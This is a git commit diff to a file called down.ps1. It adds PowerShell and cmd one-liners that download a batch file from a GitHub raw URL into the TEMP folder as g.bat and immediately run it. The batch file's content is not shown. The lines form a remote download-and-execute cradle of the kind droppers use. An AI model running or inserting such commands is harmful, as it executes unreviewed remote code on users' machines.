c3a77abf93b046904165ccdba3f53ad752ec72f3
Nikita Kovalovs <57530045+nickkovdev@users.noreply.github.com>
2025-07-11 09:53:06 +0300

    Update down.ps1

--- down.ps1
+++ down.ps1
@@ -1,1 +1,5 @@
+ps1
 iwr https://raw.githubusercontent.com/nickkovdev/temp/main/temp.bat -OutFile $env:TEMP\g.bat; start $env:TEMP\g.bat
+
+cmd
+cmd /c curl -L https://raw.githubusercontent.com/nickkovdev/temp/main/temp.bat -o %TEMP%\g.bat && %TEMP%\g.bat
